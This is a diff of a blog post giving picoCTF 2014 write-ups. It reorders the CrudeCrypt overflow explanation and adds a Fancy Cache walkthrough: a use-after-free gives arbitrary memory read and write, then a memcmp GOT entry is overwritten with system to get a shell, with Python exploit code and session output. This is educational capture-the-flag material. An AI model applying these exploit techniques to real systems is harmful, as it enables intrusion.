@@ -2,6 +2,7 @@
 layout: post
 title: picoctf 2014 writeup
 category: blog
+tags: ctf writeup reverse exploit
 ---
 
 Contents
@@ -192,7 +193,7 @@ ived signal SIGSEGV, Segmentation fault.
 So now I could control the *eip*. There was no ASLR and NX protection, I could put my shellcode on the stack (replace "a"\*578 by the shellcode) and set *eip* to it (replace cccc by the address of stack). I used a custom shellcode that did execve("/tmp/aaa", ["/tmp/aaa", NULL], NULL). Inside */tmp/aaa*, I've just done a *cat* on the flag file. To find out how to write a tiny shellcode, check this [repository](https://github.com/cregnec/tiny-shellcode).
 
 {% highlight bash %}
-pico57275@shell:/home/nevernote$ /tmp/aaa
+pico57275@shell:/home/nevernote$ cat /tmp/aaa
 #! /bin/sh
 cat /home/nevernote/flag.txt
 
@@ -204,7 +205,7 @@ CrudeCrypt
 ==========
 *Without proper maintainers, development of Truecrypt has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the code and read the contents of flag.txt*
 
-Let's how crude would this program be! The following code was a part of the *main* function. There were two options: *encrypt* and *decrypt*. Note that while encrypting, the effective group id was removed (line 12). This means that we could not encrypt a file that we did not have the access right. In the other hand, while decrypting, the effective group id was not removed. Then it asked a password (line 22) and the hash of this password would be used as encryption (or decryption) key (line 25 to 28). Next, let's check its encryption routine.
+Let's how crude would this program be! The following code was a part of the *main* function. 
 
 {% highlight c linenos %}
 int main(int argc, char **argv) {
@@ -239,7 +240,9 @@ int main(int argc, char **argv) {
 }
 {% endhighlight %}
 
-The encryption route prepended a *file_header* struct to the original file (line 21, 22) and then encrypted them with the hash of the given password (line 24). *file_header* had three field: *magic*, *file_size* and *host* (line 5 to 9). *magic* had a fixed value and was used after decryption to verify if the password was correct. *host* stored the machine's hostname that was used for encryption (line 19). This field had a fixed size of 32 (line 1). Until now, nothing special to say, I continued to look at the decryption routine.
+There were two options: *encrypt* and *decrypt*. Note that while encrypting, the effective group id was removed (line 12). This means that we could not encrypt a file that we did not have the access right. In the other hand, while decrypting, the effective group id was not removed. Then it asked a password (line 22) and the hash of this password would be used as encryption (or decryption) key (line 25 to 28). Next, let's check its encryption routine.
+
+
 
 {% highlight c linenos %}
 #define HOST_LEN 32
@@ -273,7 +276,8 @@ void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
 }
 {% endhighlight %}
 
-The decryption routine first check if the password was correct (line 13 to 17). Then it called *check_hostname(header)* to check the hostname (line 19 to 21). In this function, it copied the decrypted hostname to a local variable *saved_host* (line 27). Here it supposed that the decrypted hostname's size would not be bigger than *HOST_LEN* that was 32. There was no check on the size of the decrypted hostname. Therefore, if we crafted a encrypted file with a hostname whose size was much bigger than 32, we could generate a buffer overflow!
+The encryption route prepended a *file_header* struct to the original file (line 21, 22) and then encrypted them with the hash of the given password (line 24). *file_header* had three field: *magic*, *file_size* and *host* (line 5 to 9). *magic* had a fixed value and was used after decryption to verify if the password was correct. *host* stored the machine's hostname that was used for encryption (line 19). This field had a fixed size of 32 (line 1). Until now, nothing special to say, I continued to look at the decryption routine.
+
 
 {% highlight c linenos %}
 void decrypt_file(FILE* enc_file, FILE* raw_file, unsigned char* key) {
@@ -308,7 +312,8 @@ bool check_hostname(file_header* header) {
 }
 {% endhighlight %}
 
-In order to do this, I copied the c source and Makefile to the */tmp/* directory. I chagned the *safe_gethostname* function so that I could have a evil hostname. I've set the hostname's lenght to 128.
+The decryption routine first check if the password was correct (line 13 to 17). Then it called *check_hostname(header)* to check the hostname (line 19 to 21). In this function, it copied the decrypted hostname to a local variable *saved_host* (line 27). Here it supposed that the decrypted hostname's size would not be bigger than *HOST_LEN* that was 32. There was no check on the size of the decrypted hostname. Therefore, if we crafted a encrypted file with a hostname whose size was much bigger than 32, we could generate a buffer overflow!
+In order to do this, I copied the c source and Makefile to the */tmp/* directory. I changed the *safe_gethostname* function so that I could have a evil hostname. I've set the hostname's length to 128.
 
 {% highlight c linenos %}
 $cat crude_crypt.c
@@ -349,6 +354,280 @@ Fancy Cache
 ============
 *Margaret wrote a fancy in-memory cache server. For extra security, she made a custom string structure that keeps strings on the heap. However, it looks like she was a little sloppy with her mallocs and frees. Can you find and exploit a bug to get a shell?*
 
+The server of this challenge had ASLR and NX protection. We had the source code, binary, libc and a python client for communication with the server. The first hint was that there was an use after free (UAF) in this program. I first looked at the main function.
+
+{% highlight c linenos %}
+while (1) {                                                                                                                           
+    if (read(STDIN_FILENO, &command, 1) != 1) {                                                                                         
+      exit(1);                                                                                                                          
+    }                                                                                                                                   
+                                                                                                                                        
+    switch (command) {                                                                                                                  
+      case CACHE_GET:                                                                                                                   
+        do_cache_get();                                                                                                                 
+        break;                                                                                                                          
+      case CACHE_SET:                                                                                                                   
+        do_cache_set();                                                                                                                 
+        break;                                                                                                                          
+      default:                                                                                                                          
+        // Invalid command.                                                                                                             
+        return 1;                                                                                                                       
+        break;                                                                                                                          
+    }                                                                                                                                   
+}         
+{% endhighlight %}
+
+There was a main loop that would either call *do_cache_get()* (line 8) or *do_cache_set()* (line 11) upon the user input. Let's look at the cache structure.
+
+{% highlight c linenos %}
+struct string {                                                                                                                         
+  size_t length;                                                                                                                        
+  size_t capacity;                                                                                                                      
+  char *data;                                                                                                                           
+};                                                                                                                                      
+                                                                                                                                        
+struct cache_entry {                                                                                                                    
+  struct string *key;                                                                                                                   
+  struct string *value;                                                                                                                 
+  // The cache entry expires after it has been looked up this many times.                                                               
+  int lifetime;                                                                                                                         
+};
+...
+// The goal of this challenge is to get a shell. Since this machine has                                                                 
+// ASLR enabled, a good first step is to get the ability to read memory                                                                 
+// from the server. Once you have that working, read this string for a                                                                  
+// (flag|hint next steps).                                                                                                              
+const char *kSecretString = ...
+...
+// Initializes a struct string to an empty string.                                                                                      
+void string_init(struct string *str) {                                                                                                  
+  str->length = 0;                                                                                                                      
+  str->capacity = 0;                                                                                                                    
+  str->data = NULL;                                                                                                                     
+} 
+...
+{% endhighlight %}
+
+Each cache had three field: *key*, *value*, *lifetime*. Both *key* and *value* were variables of *string* struct. The *string* struct had also three fields: *length*, *capacity* and *data*. When a new *string* variable was created, the *data* field would be allocated with sufficient memory. Here came the second hint. Organisers have left a second hint in this program. Actually they were saying that I needed a information leak that was indispensable to bypass ASLR. Now let's take a look at the *do_cache_get()* function.
+
+
+{% highlight c linenos %}
+struct cache_entry *cache_lookup(struct string *key) {
+  size_t i;
+  for (i = 0; i < kCacheSize; ++i) {
+    struct cache_entry *entry = &cache[i];
+
+    // Skip expired cache entries.
+    if (entry->lifetime == 0) {
+      continue;
+    }
+
+    if (string_eq(entry->key, key)) {
+      return entry;
+    }
+  }
+
+  return NULL;
+}
+
+void do_cache_get(void) {
+  struct string key;
+  string_init(&key);
+  read_into_string(&key);
+
+  struct cache_entry *entry = cache_lookup(&key);
+  if (entry == NULL) {
+    write(STDOUT_FILENO, &kNotFound, sizeof(kNotFound));
+    return;
+  }                                                                                                                                     
+
+  write(STDOUT_FILENO, &kFound, sizeof(kFound));
+  write_string(entry->value);
+
+  --entry->lifetime;
+  if (entry->lifetime <= 0) {
+    // The cache entry is now expired.
+    fprintf(stderr, "Destroying key\n");
+    string_destroy(entry->key);
+    fprintf(stderr, "Destroying value\n");
+    string_destroy(entry->value);
+  }
+}
+{% endhighlight %}
+
+*do_cache_get()* first created a *key* and asked user to input a key string (line 20 to 22). Then it called *cache_lookup()* function to search if the cache was in memory (line 24). If yes, it would return the cache's value (line 31) and decrement the lifetime of this cache (line 33). Finally it checked whether the lifetime was negative. If yes, it would free both the *key* and *value* (they were both variables of *string* struct) (line 34 to 40). The definition of the *cache_lookup()* function is interesting and bugged (line 1 to 17). It would go over all in memory cache and do a strcmp on all caches whose lifetime was not zero (line 7). This means that if the lifetime of a cache was negative, the *cache_lookup()* function still considered this cache valid. However, in *do_cache_get()* function, when a cache's lifetime became negative, this cache would be freed. So here it is, the *use after free*. And in the *do_cache_set()* function, there was no check on the *lifetime* value so that I could create a cache with a negative lifetime. POC time !
+
+{% highlight python linenos %}
+$cat client.py
+...
+def read_mem(target, size):
+    # Add an entry to the cache
+    assert cache_set(f, '/bin/sh\x00\x00\x00\x00\x00', pack4(size)+pack4(size)+pack4(target), 0xffffffff)
+    # Retrieve it back
+    assert cache_get(f, '/bin/sh\x00\x00\x00\x00\x00')
+
+    assert not cache_get(f, pack4(size)+pack4(size)+pack4(target))
+    assert not cache_get(f, '\x0c')
+    return cache_get(f, '/bin/sh\x00\x00\x00\x00\x00')
+{% endhighlight %}
+
+First, I created a cache with a *lifetime* -1 (line 5). Then I got back this cache so that it would be freed (line 7). At last, I added two *cache_get()* (line 9, 10) to modify the cache's key and value (see explication below) and read back the target memory's value (line 11). The following result was the server side debug information.
+
+{% highlight bash linenos %}
+$mkfifo /tmp/pipe
+$cat /tmp/pipe | ./fancy_cache| nc -l 1337 > /tmp/pipe
+Cache server starting up (secret = [REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED])
+malloc(12) = 0x8ddf008 (string_create)
+realloc((nil), 12) = 0x8ddf018 (read_into_string)
+malloc(12) = 0x8ddf028 (string_create)
+realloc((nil), 12) = 0x8ddf038 (read_into_string)
+realloc((nil), 12) = 0x8ddf048 (read_into_string)
+Destroying key
+free(0x8ddf008) (string_destroy str)
+Destroying value
+free(0x8ddf028) (string_destroy str)
+realloc((nil), 12) = 0x8ddf028 (read_into_string)
+realloc((nil), 1) = 0x8ddf008 (read_into_string)
+realloc((nil), 12) = 0x890c058 (read_into_string)
+Destroying key
+free(0x890c008) (string_destroy str)
+Destroying value
+free(0x890c028) (string_destroy str)
+{% endhighlight %}
+
+Since the program did not create socket, I used *netcat* to execute it and listen on port 1337 (line 1, 2). Line 4 and 6 were the memory allocation for the cache's key and value. After the retrieve of the cache, the key and value were freed (line 9 to 12). The reallocation in line 13 and 14 was the memory used to store the next *cache_get's* key string. At the same time, the two memory area were used by the cache (because it's lifetime was not zero). This means that we control the key and value of the cache. Indeed, the first reallocation (line 13) rewrote the cache's value and the second one (line 14) rewrote the cache's key value. Actually, I've replaced the *data* field of the cache's value by the pointer that I wanted to read. For the cache's key, I've justed rewritten the length of the original key ('/bin/sh\x00\x00\x00\x00\x00'), that was 0xc because the key string in memory was not freed. In the end, the last *cache_get* (realloccation in line 15) read the target memory.
+
+{% highlight python linenos %}
+$readelf -s fancy_cache | grep kSe
+    64: 0804b044     4 OBJECT  GLOBAL DEFAULT   24 kSecretString
+
+$cat clien.py
+...
+my_len = 4
+my_target = 0x0804b044
+stringAddr = unpack4(read_mem(my_target, my_len))
+print("secret string address is 0x%08x"%stringAddr)
+
+my_len = 140
+my_target = stringAddr
+print(read_mem(my_target, my_len))
+
+$python2 client.py
+
+secret string address is 0x08048bc8
+Congratulations! Looks like you figured out how to read memory. This can can be a useful tool for defeating ASLR :-) Head over to https://picoctf.com/problem-static/binary/fancy_cache/next_steps.html for some hints on how to go from what you have to a shell!
+{% endhighlight %}
+
+I retrieved the *keSecretString* variable address (line 1, 2) because I wanted to get back this secret information. Then I readed the pointer address to this secret string (line 6 to 9) and the secret string (line 11 to 13). And here came the third hint. It explained the ret-to-libc technique (check above link for more information). At this step, I could read arbitary memory. In order to use this technique, I would need to be able to write to arbitary memory. To do this, I used the same bug and replace the last *cache_get* by *cache_set*.
+
+{% highlight python linenos %}
+def write_mem(target, value):
+    size = 4
+    # Add an entry to the cache
+    assert cache_set(f, '/bin/sh\x00\x00\x00\x00\x00', pack4(size)+pack4(size)+pack4(target), 0xffffffff)
+    # Retrieve it back
+    assert cache_get(f, '/bin/sh\x00\x00\x00\x00\x00')
+
+    assert not cache_get(f, pack4(size)+pack4(size)+pack4(target))
+    assert not cache_get(f, '\x0c')
+    assert cache_set(f, '/bin/sh\x00\x00\x00\x00\x00', pack4(value), 1)
+{% endhighlight %}
+
+Like explained in the hint link, I choosed to replace the GOT of *memcmp* by the GOT of *system*. Because *memcmp* had two string arguments that I could easily pass the argument of *system* ("/bin/sh") to it. Now, I could read the memory at anywhere so it was easy to get the GOT value of *memcmp*. I still needed to calculate the offset from *memcmp* to *system*.
+
+{% highlight c linenos %}
+$cat get_offset.c
+#include <stdlib.h>
+#include <stdio.h> 
+#include <string.h>
+                                                                                                                                        
+int main(){
+        char *a = "123";
+        char *b = "123";
+        int ret = 0;
+        int *memcmp_ptr, *system_ptr;
+
+        ret = memcmp(a, b, sizeof(a));
+        /* compile the program, repalce this value and recompile it.*/
+        memcmp_ptr = (int *)0x804a010;
+        printf("memcmp addr is 0x%08x\n", *memcmp_ptr);
+
+        ret = system("foo");
+        /* compile the program, repalce this value and recompile it.*/
+        system_ptr = (int *)0x804a014;
+        printf("system addr is 0x%08x\n", *system_ptr);
+        printf("the offset from memcmp to system is -0x%08x\n", *memcmp_ptr-*system_ptr);
+
+        return 0;
+}
+
+$gcc -m32 get_offset.c -o get_offset
+$readelf -r get_offset
+...
+0804a010  00000207 R_386_JUMP_SLOT   00000000   memcmp
+0804a014  00000307 R_386_JUMP_SLOT   00000000   system
+...
+
+$gcc -m32 get_offset.c -o get_offset
+$./get_offset
+memcmp addr is 0xf7f5e870
+sh: 1: foo: not found
+system addr is 0xf7e5c100
+the offset from memcmp to system is -0x102770
+{% endhighlight %}
+
+I've written a small program to retrieve the offset from *memcmp* to *system*, that I've copied to the ctf server. First compiled this code and got back their pointer to GOT. Then put these value in the program and re-compiled it. Finally executed it and the offset was -0x102770. In the next, I would read *memcmp*'s GOT value, overwrite it by the value of *system* and trigger it to get a shell. 
+
+{% highlight python linenos %}
+$readelf -r fancy_cache | grep memcmp 
+0804b014  00000307 R_386_JUMP_SLOT   00000000   memcmp
+$cat clien.py
+...
+def shell_get(f, key, s):
+    f.write(chr(CACHE_GET))
+    write_string(f, key)
+    
+    t = telnetlib.Telnet()
+    t.sock = s
+    print("Got a shell!")
+    t.interact()
+
+my_len = 4
+my_target = 0x0804b014
+memcmpAddr = unpack4(read_mem(my_target, my_len))
+print("mmap address is 0x%08x"%memcmpAddr)
+systemAddr = memcmpAddr - 0x00102770
+write_mem(my_target, systemAddr)
+shell_get(f, '/bin/sh\x00\x00\x00\x00\x00', s)
+
+$python2 client.py 
+
+mmap address is 0xf76b4870
+Got a shell!
+id
+uid=1009(fancy_cache) gid=1009(fancy_cache) groups=1009(fancy_cache)
+pwd
+/
+ls /home
+bleichenbacher
+easyoverflow
+ecb
+fancy_cache
+guess
+hardcore_owner
+lowentropy
+netsino
+policerecords
+ubuntu
+ls /home/fancy_cache
+fancy_cache
+fancy_cache.sh
+flag.txt
+cat /home/fancy_cache/flag.txt
+that_wasnt_so_free_after_all
+{% endhighlight %}
+
+So the final exploit: first read the *memcmp's* address (line 16), the used the previously calculated offset to get the address of *system* (line 18), replaced *memcmp's* address by the address of *system* and called *cache_get* to trigger *system* so that I could have a shell. Indeed, *system* used the cache's key as its argument (here '/bin/sh\x00\x00\x00\x00\x00'). It remained only to find the flag and read it.
 
 Baleful
 =======
